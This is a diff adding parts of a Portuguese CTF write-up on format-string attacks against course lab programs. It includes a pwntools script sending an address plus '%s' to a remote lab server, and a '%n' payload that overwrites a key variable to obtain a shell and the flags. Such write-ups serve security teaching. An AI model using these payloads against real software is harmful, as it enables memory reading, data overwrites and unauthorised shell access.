@@ -11,7 +11,7 @@ Sendo `<file>` o nome do ficheiro usado, no nosso caso: `badfile`.
 ## Tarefa 1
 
 Como o objetivo nesta tarefa é *crashar* o programa, pensamos em aceder a endereços
-de memória inválidos usando a *format-string* que vamos fornecer como input.  
+de memória inválidos usando a *format-string* que vamos fornecer como *input*.  
 
 Para tal decidimos usar:
 ```
@@ -79,8 +79,8 @@ O objetivo é dar *print* de uma variável global do tipo *string*.
 Para tal, é necessário:
 
 1. Saber o endereço onde se encontra.
-2. Colocar na stack o valor do endereço do ponto 1.
-3. Aceder ao endereço e dar `print` da string aí encontrada.
+2. Colocar na *stack* o valor do endereço do ponto 1.
+3. Aceder ao endereço e dar `print` da *string* aí encontrada.
 
 O ponto `1.` é dado pelo *printout* do *server*:  
 ![/imgs6/secret_message_address.png](/imgs6/secret_message_address.png)
@@ -199,29 +199,139 @@ valor hexadecimal de 4 *bytes*.
 
 ### Desafio 1
 
+Começamos por executar o seguinte comando:
+```sh
+checksec program
+```
+que retornou a seguinte informação:  
+![/imgs6/ctf/checksec_program.png](/imgs6/ctf/checksec_program.png)
+
+Aqui apercebemo-nos que existem mais proteções ativas relativamente ao desafio da semana
+passada. Contudo, continua a não existir randomização das posições do binário, o que vai ser
+útil no nosso ataque, pois faz com que os endereços do programa sejam estáticos.
+
+Após esta análise inicial, analisámos o *source code* de forma a responder às questões
+levantadas no enunciado:
+
+1. Qual é a linha do código onde a vulnerabilidade se encontra?
+    - Linha 27: `printf(buffer);`.
+
+2. O que é que a vulnerabilidade permite fazer?
+    - Dado que o *buffer* é preenchido com *input*, é possível ter *format-specifiers* no
+    *buffer* que causem a leitura de dados da *stack*.
+
+3. Qual é a funcionalidade que te permite obter a flag?
+    - *Format-specifier* para *strings*: `%s`.
+
+
+Para realizar o ataque torna-se necessário em primeiro lugar saber o endereço onde se
+encontra a *flag*. Como sugerido, recorremos ao *gdb*:  
+![/imgs6/ctf/flag1_address.png](/imgs6/ctf/flag1_address.png)
+
+Assim, só falta descobrir o *offset* na *stack* entre o endereço da *format string*
+e o *buffer* onde é guardado a *format string* passada como *input*.  
+Para tal, passamos como *input* `AAAA-%x` e obtivémos:  
+![/imgs6/ctf/offset.png](/imgs6/ctf/offset.png)
+
+Daqui concluimos que, a *format string* no *buffer*, esta imediatamente por cima do endereço da
+*format string* o que faz com que, se colocarmos um endereço de uma *string* no início do
+*input*, ele pode ser acedido acrescentando ao *input* um simples `%s`.
+
+Deste modo, foi precisamente isso que fizemos alterando o *script* de *python* fornecido:
+
+```py
+from pwn import *
+
+LOCAL = False
+
+if LOCAL:
+    p = process("./program")
+    """
+    O pause() para este script e permite-te usar o gdb para dar attach ao processo
+    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
+    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
+    Depois correr o gdb de forma a dar attach. 
+    (Exemplo: `$ gdb attach 9717` )
+    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
+    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
+    """
+    pause()
+else:    
+    p = remote("10.227.243.188", 4004)
+
+p.recvuntil(b"got:")
+p.sendline(b"\x60\xc0\x04\x08%s")
+p.interactive()
+```
+
+De notar que o endereço da `flag` teve que ser invertido devido ao sistema ser *little-endian*.
+
+Após correr o *script* obteve-se o seguinte resultado:  
+![/imgs6/ctf/flag1.png](/imgs6/ctf/flag1.png)
+
+Estando assim a flag obtida:
+```
+flag{8232a42d247981b2e46cda36d1b92629}
+```
+
+
 ### Desafio 2
 
 
+Mais uma vez, começamos por executar o seguinte comando:
+```sh
+checksec program
+```
+que retornou a mesma informação que no desafio anterior:  
+![/imgs6/ctf/checksec_program.png](/imgs6/ctf/checksec_program.png)
 
 
+Após esta análise inicial, analisámos o *source code* de forma a responder às questões
+levantadas no enunciado:
+
+1. Qual é a linha do código onde a vulnerabilidade se encontra? E o que é que a vulnerabilidade permite fazer?
+    - Linha 14: `printf(buffer);`. Permite passar uma *format string* com vários *format-specifiers*
+    que não vão ter os correspondentes argumentos em `printf()` e que, por isso, vão permitir aceder a outras posições
+    de memória da *stack*. Neste caso interessa modificar a variável `key`.
+2. A flag é carregada para memória? Ou existe alguma funcionalidade que podemos utilizar para ter acesso à mesma.
+    - A flag não é carregada para memória. Contudo, é possível fazer *exploit* da vulnerabilidade encontrada
+    usando o *format-specifier* `%n` que permite escrever no endereço dado, o número de caracteres *printed*
+    até ao momento.
+3. Para desbloqueares essa funcionalidade o que é que tens de fazer?
+    - É necessário conhecer o endereço onde se encontra a `key` e após isso, fazer com que `%n` seja precedido
+    por tantos caracteres quanto o valor que se pretende atribuir a `key`.
+
+Para realizar o ataque torna-se necessário em primeiro lugar saber o endereço onde se
+encontra a *key*. Como sugerido, recorremos ao *gdb*:  
+![/imgs6/ctf/key_address.png](/imgs6/ctf/key_address.png)
+
+O valor que se pretende escrever é o da condição da linha 17 do programa: `if(key == 0xbeef)`. 
+
+`0xbeef = 48879` e dado que o endereço vai ser escrito primeiramente e ocupa 4 *bytes*,
+basta escrever entre ele e o *format-specifier* `48879 - 4 = 48875` caracteres/*bytes*.
+
+Verificamos de novo que a *format string* no *buffer* esta imediatamente por cima do endereço da
+*format string* e estamos prontos para efetuar o ataque.  
 
 
+Com estas informações, construimos assim o *input*:
+```
+\x34\xc0\x04\x08%48875x%1$n
+```
 
+Composto pelo endereço com os *bytes* pela ordem inversa, um *print* de um valor na *stack*
+em hexadecimal com *leading spaces* para prefazer o total de `0xbeef` *bytes* escritos e por fim
+o `%n`.  
+De notar que teve que ser usado `%1$n` de modo a utilizar o suposto 1.º argumento do `printf()`
+(endereço `key`) mesmo após ele já ter sido usado pelo *format-specifier* anterior.
 
+Que foi passado após executar:
+```sh
+nc ctf-fsi.fe.up.pt 4005
+```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+E que devolveu uma *shell* que permitou aceder ao ficheiro `flag.txt` e obter a *flag*:  
+![/imgs6/ctf/flag2.png](/imgs6/ctf/flag2.png)
+```
+flag{3a112ce6ee831d3a365d49ec58401eb6}
+```
